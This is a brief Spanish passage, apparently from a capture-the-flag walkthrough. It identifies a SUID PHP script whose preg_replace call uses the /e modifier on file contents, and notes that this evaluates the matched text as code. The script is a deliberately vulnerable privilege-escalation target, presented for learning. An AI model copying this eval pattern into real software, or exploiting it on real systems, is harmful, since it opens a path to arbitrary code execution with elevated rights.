# Aprecio que hay un fichero php con permisos SUID:

#!/usr/bin/php

<?php
function y($m){
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);

print $r;

?>

# Veo que en el ficherro se ejecuta /e que es una función de PHP que evalua el resultado de una expresión regular
